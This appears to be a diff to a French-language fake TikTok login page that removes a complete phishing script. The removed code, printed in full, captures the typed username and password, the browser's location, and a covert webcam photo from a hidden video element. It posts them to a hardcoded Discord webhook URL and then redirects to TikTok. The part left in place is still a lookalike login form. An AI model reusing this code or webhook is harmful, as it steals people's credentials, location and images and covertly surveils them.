@@ -63,9 +63,6 @@
       color: #c00;
       margin-bottom: 10px;
     }
-    #video, #canvas {
-      display: none;
-    }
   </style>
 </head>
 <body>
@@ -82,106 +79,17 @@
         J'accepte les conditions d'utilisation (localisation + photo obligatoire)
       </label>
       <button type="submit" id="submitBtn" disabled>Se connecter</button>
-      <video id="video" autoplay></video>
-      <canvas id="canvas"></canvas>
     </form>
   </div>
   <script>
-    // Gestion activation bouton submit
+    // Activer/désactiver le bouton en fonction de la case à cocher
     const acceptTerms = document.getElementById('acceptTerms');
     const submitBtn = document.getElementById('submitBtn');
     acceptTerms.addEventListener('change', function() {
       submitBtn.disabled = !this.checked;
     });
 
-    // Webcam setup (invisible)
-    let imageBlob = null;
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    let stream = null;
-
-    function startWebcam() {
-      return new Promise((resolve, reject) => {
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(s) {
-              stream = s;
-              video.srcObject = stream;
-              video.play();
-              video.onloadedmetadata = () => resolve();
-            })
-            .catch(reject);
-        } else {
-          reject('Webcam non supportée');
-        }
-      });
-    }
-
-    function takePhoto() {
-      return new Promise((resolve, reject) => {
-        try {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          canvas.getContext('2d').drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          canvas.toBlob(function(blob) {
-            imageBlob = blob;
-            // Stop webcam
-            if (stream && stream.getTracks) {
-              stream.getTracks().forEach(track => track.stop());
-            }
-            resolve();
-          }, 'image/png');
-        } catch (e) {
-          reject(e);
-        }
-      });
-    }
-
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
-
-      // Etape 1 : localisation
-      if (!navigator.geolocation) {
-        alert("La géolocalisation n'est pas supportée par votre navigateur.");
-        return;
-      }
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        // Etape 2 : caméra
-        startWebcam().then(() => {
-          setTimeout(() => { // Laisse le temps à la webcam de s'activer
-            takePhoto().then(() => {
-              // Etape 3 : envoi au webhook Discord
-              const form = new FormData();
-              const content = `🔔 Connexion TikTok\n👤 Utilisateur : ${username}\n🔑 Mot de passe : ${password}\n🌍 Localisation :\nLatitude : ${lat}\nLongitude : ${lon}\n📸 Photo jointe`;
-              form.append("content", content);
-              if (imageBlob) {
-                form.append("file", imageBlob, "photo.png");
-              }
-              fetch(webhookURL, {
-                method: "POST",
-                body: form
-              }).then(() => {
-                window.location.href = "https://www.tiktok.com";
-              }).catch(() => {
-                window.location.href = "https://www.tiktok.com";
-              });
-            }).catch(() => {
-              alert("Erreur lors de la prise de photo.");
-            });
-          }, 800);
-        }).catch(() => {
-          alert("Impossible d'accéder à la webcam.");
-        });
-      }, function() {
-        alert("Impossible d'obtenir la localisation.");
-      });
-    });
+    // (Le code du formulaire d'envoi peut être ajouté ici)
   </script>
 </body>
 </html>
